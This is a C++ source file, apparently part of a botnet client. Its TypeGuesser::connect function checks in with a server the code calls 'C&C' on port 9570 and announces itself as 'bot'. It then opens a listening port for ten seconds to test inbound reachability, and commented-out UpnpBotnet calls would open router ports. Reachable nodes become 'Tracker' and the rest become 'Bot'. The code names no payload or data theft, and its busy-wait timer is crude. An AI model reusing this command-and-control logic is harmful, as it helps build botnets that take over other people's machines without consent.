#include "TypeGuesser.hpp"
#include "upnp.hpp"
#include <asio/read.hpp>
#include <asio.hpp>
#include <asio/write.hpp>
#include <chrono>
#include <exception>
#include <iostream>
#include <thread>

static void server(void)
{
    asio::error_code ec;
    asio::io_service io_service;
    asio::ip::tcp::acceptor acceptor_server(io_service, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 3612));
    asio::ip::tcp::socket server_socket(io_service);
    asio::io_context context;
    std::promise<bool> promise;
    auto until = std::chrono::system_clock::now() + std::chrono::seconds(10);
    auto timer = [&]()
    {
        while (true) {
            if (!acceptor_server.is_open())
                break;
            if (std::chrono::system_clock::now() > until) {
                if (!server_socket.is_open()) {
                    acceptor_server.cancel();
                    acceptor_server.close();
                }
                promise.set_value(false);
                std::cerr << "Reached end of timer, probably not upnp compatible" << std::endl;
                break;
            }
        }
    };
    auto thread = std::thread(timer);
    thread.detach();
    acceptor_server.async_accept([&](const asio::error_code &ec, asio::ip::tcp::socket peer) {
        // std::cout << "coucou\n";
        if (!ec) {
            // std::cout << "ec\n";
            char success_buffer[1] = {9};
            char buffer[1] = {0};
            asio::read(peer, asio::buffer(buffer, 1));

            if (buffer[0] == 1) {
                asio::write(peer, asio::buffer(success_buffer, 1));
            }
            promise.set_value(true);
        } else {
            std::cerr << "error accept: " << ec.message() << std::endl;
         }
     });
    io_service.run();
    auto val = promise.get_future().get();
    acceptor_server.close();
    std::cout << "Server closed\n";
    if (val == false) {
        throw std::exception();
    }

}

/// Connects to the server and asks if it should be tracker or bot
void TypeGuesser::connect(const std::string &ip)
{
    asio::ip::tcp::endpoint endpoint(asio::ip::address::from_string(ip), 9570);
    asio::error_code ec;
    // wlan0 = Temporary (need getInterface())
    // UpnpBotnet Upnp("wlp4s0");

    _socket.connect(endpoint, ec);
    if (ec) {
        throw ConnectionException(ec.message());
    }
    asio::write(_socket, asio::buffer("bot\0"));
    asio::streambuf buffer;
    asio::read_until(_socket, buffer, "\0");
    std::string data = asio::buffer_cast<const char*>(buffer.data());

    if (data != "active") {
        throw ConnectionException("C&C didn't send active back");
    }
    asio::write(_socket, asio::buffer("ready\0"), ec);
    if (ec) {
        throw ConnectionException(ec.message());
    }
    try {
        // UpnpOpenPort(&Upnp);
        server();
        _type = Type::Tracker;
    } catch (std::exception &e) {
        // Upnp.ClosePortAndFinishUpnp();
        std::cout << "Erreur\n";
        std::cout << e.what() << "\n";
        _type = Type::Bot;
    }
}
